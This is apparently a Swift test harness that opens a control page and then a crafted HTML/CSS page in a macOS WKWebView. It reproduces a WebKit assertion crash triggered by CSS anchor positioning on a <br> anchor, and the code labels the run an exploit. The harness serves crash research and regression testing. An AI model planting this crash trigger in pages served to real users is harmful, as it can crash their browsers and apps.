import AppKit
import WebKit

// Phase B: 4847c476a8 — anchor position-visibility crash on <br> anchor
// RELEASE_ASSERT in AnchorPositionEvaluator → WTFCrashWithInfo → exit 134

let TRIGGER_HTML = """
<!DOCTYPE html>
<style>
#target {
  position: absolute;
  position-anchor: --a1;
  position-visibility: anchors-visible;
  top: anchor(--a1 top);
}
</style>
<div><br id="anchor" style="anchor-name: --a1"></div>
<div id="target"></div>
<script>
setTimeout(() => {
  window.webkit.messageHandlers.done.postMessage('loaded');
}, 500);
</script>
"""

let CONTROL_HTML = """
<div id="target"></div>
<script>
setTimeout(() => {
  window.webkit.messageHandlers.done.postMessage('control');
}, 500);
</script>
"""

class PhaseB: NSObject, NSApplicationDelegate, WKScriptMessageHandler {
    var window: NSWindow?
    var webView: WKWebView?
    var step = 0
    var startTime = Date()

    func applicationDidFinishLaunching(_ n: Notification) {
        startTime = Date()
        print("=== Phase B: 4847c476a8 anchor position-visibility crash ===")
        print("macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)")
        runControl()
    }

    func makeWebView() -> WKWebView {
        let config = WKWebViewConfiguration()
        config.userContentController.add(self, name: "done")
        let wv = WKWebView(frame: NSRect(x:0,y:0,width:800,height:600), configuration: config)
        let win = NSWindow(contentRect: NSRect(x:0,y:0,width:800,height:600),
            styleMask: [.titled], backing: .buffered, defer: false)
        win.contentView = wv
        win.makeKeyAndOrderFront(nil)
        self.window = win
        self.webView = wv
        return wv
    }

    func runControl() {
        print("--- CONTROL: plain div, no anchor ---")
        let wv = makeWebView()
        wv.loadHTMLString(CONTROL_HTML, baseURL: nil)
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            print("CONTROL: ok — no crash")
            self.webView?.stopLoading()
            self.runExploit()
        }
    }

    func runExploit() {
        print("--- EXPLOIT: anchor position-visibility + <br> anchor ---")
        let wv = makeWebView()
        wv.loadHTMLString(TRIGGER_HTML, baseURL: nil)
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            let elapsed = Int(Date().timeIntervalSince(self.startTime))
            print("EXPLOIT: no crash after 5s (\(elapsed)s total)")
            print("RESULT=INCONCLUSIVE")
            exit(0)
        }
    }

    func userContentController(_ c: WKUserContentController, didReceive msg: WKScriptMessage) {
        let elapsed = Int(Date().timeIntervalSince(startTime))
        print("MSG: \(msg.body) (\(elapsed)s)")
        if "\(msg.body)" == "loaded" {
            print("EXPLOIT: page loaded — if no crash in 3s, inconclusive")
        }
    }
}

signal(SIGCHLD) { _ in print("*** SIGCHLD — child crashed ***") }

let app = NSApplication.shared
let d = PhaseB()
app.delegate = d
app.run()
